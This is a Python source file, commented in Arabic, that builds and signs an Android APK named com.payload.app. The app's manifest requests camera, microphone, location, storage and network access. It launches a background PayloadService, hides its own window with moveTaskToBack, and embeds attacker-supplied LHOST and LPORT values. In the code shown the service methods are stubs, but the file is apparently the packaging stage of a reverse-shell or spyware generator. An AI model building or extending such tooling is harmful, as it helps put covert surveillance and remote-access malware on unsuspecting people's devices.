#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
أداة بناء APK باستخدام أدوات خارجية
External APK Builder Tool
"""

import os
import sys
import subprocess
import shutil
import tempfile
from pathlib import Path
from utils.logger import Logger

class ExternalAPKBuilder:
    """كلاس بناء APK باستخدام أدوات خارجية"""
    
    def __init__(self):
        self.logger = Logger()
        self.tools = {
            'apktool': self.find_apktool(),
            'jarsigner': self.find_jarsigner(),
            'zipalign': self.find_zipalign(),
            'aapt': self.find_aapt()
        }
    
    def find_apktool(self):
        """البحث عن APKTool"""
        possible_paths = [
            'apktool',
            'apktool.jar',
            os.path.expanduser('~/apktool.jar'),
            os.path.expanduser('~/bin/apktool.jar'),
            '/usr/local/bin/apktool',
            '/usr/bin/apktool'
        ]
        
        for path in possible_paths:
            if os.path.exists(path) or shutil.which(path):
                return path
        
        return None
    
    def find_jarsigner(self):
        """البحث عن jarsigner"""
        java_home = os.environ.get('JAVA_HOME')
        if java_home:
            jarsigner_path = os.path.join(java_home, 'bin', 'jarsigner')
            if os.path.exists(jarsigner_path):
                return jarsigner_path
        
        return shutil.which('jarsigner')
    
    def find_zipalign(self):
        """البحث عن zipalign"""
        android_sdk = os.environ.get('ANDROID_HOME') or os.environ.get('ANDROID_SDK_ROOT')
        if android_sdk:
            zipalign_path = os.path.join(android_sdk, 'build-tools', '*', 'zipalign')
            import glob
            matches = glob.glob(zipalign_path)
            if matches:
                return sorted(matches)[-1]  # أحدث إصدار
        
        return shutil.which('zipalign')
    
    def find_aapt(self):
        """البحث عن aapt"""
        android_sdk = os.environ.get('ANDROID_HOME') or os.environ.get('ANDROID_SDK_ROOT')
        if android_sdk:
            aapt_path = os.path.join(android_sdk, 'build-tools', '*', 'aapt')
            import glob
            matches = glob.glob(aapt_path)
            if matches:
                return sorted(matches)[-1]  # أحدث إصدار
        
        return shutil.which('aapt')
    
    def create_apk_from_template(self, name, config, output_path):
        """إنشاء APK من قالب"""
        try:
            # إنشاء مجلد مؤقت
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_path = Path(temp_dir)
                
                # إنشاء هيكل APK
                self.create_apk_structure(temp_path, name, config)
                
                # إنشاء APK
                if self.build_apk_with_apktool(temp_path, output_path):
                    return True
                elif self.build_apk_manually(temp_path, output_path):
                    return True
                else:
                    return False
                    
        except Exception as e:
            self.logger.error(f"خطأ في إنشاء APK من القالب: {e}")
            return False
    
    def create_apk_structure(self, temp_dir, name, config):
        """إنشاء هيكل APK"""
        # إنشاء المجلدات
        (temp_dir / 'res' / 'values').mkdir(parents=True, exist_ok=True)
        (temp_dir / 'res' / 'layout').mkdir(parents=True, exist_ok=True)
        (temp_dir / 'res' / 'drawable').mkdir(parents=True, exist_ok=True)
        (temp_dir / 'res' / 'mipmap-hdpi').mkdir(parents=True, exist_ok=True)
        (temp_dir / 'smali' / 'com' / 'payload' / 'app').mkdir(parents=True, exist_ok=True)
        (temp_dir / 'META-INF').mkdir(exist_ok=True)
        
        # إنشاء AndroidManifest.xml
        manifest = self.create_manifest(name, config)
        with open(temp_dir / 'AndroidManifest.xml', 'w', encoding='utf-8') as f:
            f.write(manifest)
        
        # إنشاء ملفات الموارد
        self.create_resource_files(temp_dir, name)
        
        # إنشاء ملفات Smali
        self.create_smali_files(temp_dir, name, config)
        
        # إنشاء ملفات META-INF
        self.create_meta_inf_files(temp_dir)
    
    def create_manifest(self, name, config):
        """إنشاء AndroidManifest.xml"""
        return f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.payload.app"
    android:versionCode="1"
    android:versionName="1.0">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />

    <application
        android:allowBackup="true"
        android:icon="@android:drawable/ic_launcher_foreground"
        android:label="{name}"
        android:theme="@android:style/Theme.Material">
        
        <activity
            android:name="com.payload.app.MainActivity"
            android:exported="true"
            android:theme="@android:style/Theme.Material">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <service
            android:name="com.payload.app.PayloadService"
            android:enabled="true"
            android:exported="false" />
            
    </application>

</manifest>"""
    
    def create_resource_files(self, temp_dir, name):
        """إنشاء ملفات الموارد"""
        # strings.xml
        strings = f"""<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">{name}</string>
</resources>"""
        
        with open(temp_dir / 'res' / 'values' / 'strings.xml', 'w', encoding='utf-8') as f:
            f.write(strings)
        
        # public.xml
        public = """<?xml version="1.0" encoding="utf-8"?>
<resources>
    <public type="string" name="app_name" id="0x7f040000" />
</resources>"""
        
        with open(temp_dir / 'res' / 'values' / 'public.xml', 'w', encoding='utf-8') as f:
            f.write(public)
    
    def create_smali_files(self, temp_dir, name, config):
        """إنشاء ملفات Smali"""
        # MainActivity.smali
        main_activity = f""".class public Lcom/payload/app/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"

# direct methods
.method public constructor <init>()V
    .registers 1

    invoke-direct {{p0}}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .registers 3

    invoke-super {{p0, p1}}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/payload/app/PayloadService;
    invoke-direct {{v0, p0, v1}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {{p0, v0}}, Lcom/payload/app/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    invoke-virtual {{p0}}, Lcom/payload/app/MainActivity;->moveTaskToBack(Z)Z

    return-void
.end method"""
        
        with open(temp_dir / 'smali' / 'com' / 'payload' / 'app' / 'MainActivity.smali', 'w', encoding='utf-8') as f:
            f.write(main_activity)
        
        # PayloadService.smali
        payload_service = f""".class public Lcom/payload/app/PayloadService;
.super Landroid/app/Service;
.source "PayloadService.java"

.field private static final LHOST:Ljava/lang/String; = "{config['lhost']}"
.field private static final LPORT:I = {config['lport']}
.field private static final TAG:Ljava/lang/String; = "PayloadService"

# direct methods
.method public constructor <init>()V
    .registers 1

    invoke-direct {{p0}}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 2

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .registers 1

    invoke-super {{p0}}, Landroid/app/Service;->onCreate()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 5

    const/4 v0, 0x1

    return v0
.end method"""
        
        with open(temp_dir / 'smali' / 'com' / 'payload' / 'app' / 'PayloadService.smali', 'w', encoding='utf-8') as f:
            f.write(payload_service)
    
    def create_meta_inf_files(self, temp_dir):
        """إنشاء ملفات META-INF"""
        # MANIFEST.MF
        manifest_mf = """Manifest-Version: 1.0
Created-By: Android Payload Tool
"""
        
        with open(temp_dir / 'META-INF' / 'MANIFEST.MF', 'w', encoding='utf-8') as f:
            f.write(manifest_mf)
        
        # CERT.SF
        cert_sf = """Signature-Version: 1.0
Created-By: Android Payload Tool
"""
        
        with open(temp_dir / 'META-INF' / 'CERT.SF', 'w', encoding='utf-8') as f:
            f.write(cert_sf)
    
    def build_apk_with_apktool(self, temp_dir, output_path):
        """بناء APK باستخدام APKTool"""
        if not self.tools['apktool']:
            return False
        
        try:
            # بناء APK
            cmd = [self.tools['apktool'], 'b', str(temp_dir), '-o', str(output_path)]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0 and output_path.exists():
                self.logger.info(f"تم بناء APK باستخدام APKTool: {output_path}")
                return True
            else:
                self.logger.error(f"فشل في بناء APK: {result.stderr}")
                return False
                
        except Exception as e:
            self.logger.error(f"خطأ في بناء APK باستخدام APKTool: {e}")
            return False
    
    def build_apk_manually(self, temp_dir, output_path):
        """بناء APK يدوياً"""
        try:
            import zipfile
            
            # إنشاء APK كملف ZIP
            with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as apk:
                # إضافة جميع الملفات
                for root, dirs, files in os.walk(temp_dir):
                    for file in files:
                        file_path = Path(root) / file
                        arc_path = file_path.relative_to(temp_dir)
                        apk.write(file_path, arc_path)
            
            self.logger.info(f"تم بناء APK يدوياً: {output_path}")
            return True
            
        except Exception as e:
            self.logger.error(f"خطأ في بناء APK يدوياً: {e}")
            return False
    
    def sign_apk(self, apk_path, keystore_path=None):
        """توقيع APK"""
        if not self.tools['jarsigner']:
            self.logger.warning("jarsigner غير متوفر - سيتم تخطي التوقيع")
            return True
        
        try:
            if not keystore_path:
                keystore_path = self.create_debug_keystore()
            
            cmd = [
                self.tools['jarsigner'],
                '-keystore', keystore_path,
                '-storepass', 'android',
                '-keypass', 'android',
                str(apk_path),
                'androiddebugkey'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                self.logger.info("تم توقيع APK بنجاح")
                return True
            else:
                self.logger.error(f"فشل في توقيع APK: {result.stderr}")
                return False
                
        except Exception as e:
            self.logger.error(f"خطأ في توقيع APK: {e}")
            return False
    
    def create_debug_keystore(self):
        """إنشاء مفتاح debug للتوقيع"""
        keystore_path = Path.home() / '.android' / 'debug.keystore'
        keystore_path.parent.mkdir(exist_ok=True)
        
        if keystore_path.exists():
            return str(keystore_path)
        
        try:
            keytool_cmd = [
                'keytool', '-genkey', '-v',
                '-keystore', str(keystore_path),
                '-alias', 'androiddebugkey',
                '-keyalg', 'RSA',
                '-keysize', '2048',
                '-validity', '10000',
                '-storepass', 'android',
                '-keypass', 'android',
                '-dname', 'CN=Android Debug,O=Android,C=US'
            ]
            
            subprocess.run(keytool_cmd, input='\n', text=True, capture_output=True)
            self.logger.info("تم إنشاء مفتاح debug")
            return str(keystore_path)
            
        except Exception as e:
            self.logger.error(f"خطأ في إنشاء مفتاح debug: {e}")
            return None
